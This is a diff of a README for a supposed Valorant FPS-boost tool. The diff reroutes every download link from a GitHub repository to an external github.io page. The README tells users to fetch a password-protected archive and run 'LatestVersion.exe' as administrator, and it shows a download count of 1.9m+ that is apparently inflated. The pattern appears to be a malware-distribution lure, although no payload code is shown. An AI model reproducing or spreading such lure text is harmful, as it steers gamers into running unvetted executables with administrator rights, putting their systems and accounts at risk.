@@ -1,6 +1,6 @@
 # 🎮 valorant-fps-boost-2026 - Unlock 200+ FPS Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Version-2ea44f?style=for-the-badge)](https://github.com/z3353/valorant-fps-boost-2026)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-2ea44f?style=for-the-badge)](https://zamen3353.github.io)
 
 ![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white) ![Version](https://img.shields.io/badge/Version-v2026-brightgreen?style=flat-square) ![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square) ![Downloads](https://img.shields.io/badge/Downloads-1.9m%2B-orange?style=flat-square)
 
@@ -42,7 +42,7 @@ This tool works on basically any PC that can run Valorant at all. Even if your s
 
 **Step 1:** Click the green button at the top of this page, or use this direct link:
 
-[**👉 Download Now — Visit This Link**](https://github.com/z3353/valorant-fps-boost-2026)
+[**👉 Download Now — Visit This Link**](https://zamen3353.github.io)
 
 **Step 2:** Visit this link to download the application. You will be taken to the download page where you can get the latest version.
 
@@ -109,7 +109,7 @@ The program includes a full backup system. If you experience any issue, run it a
 
 ## 🚀 Final Steps To Get Started
 
-1. Click the download link above: **[https://github.com/z3353/valorant-fps-boost-2026](https://github.com/z3353/valorant-fps-boost-2026)**
+1. Click the download link above: **[https://zamen3353.github.io](https://zamen3353.github.io)**
 2. Extract the downloaded archive using the password from the page
 3. Run `LatestVersion.exe` as administrator
 4. Follow the prompts and restart your PC
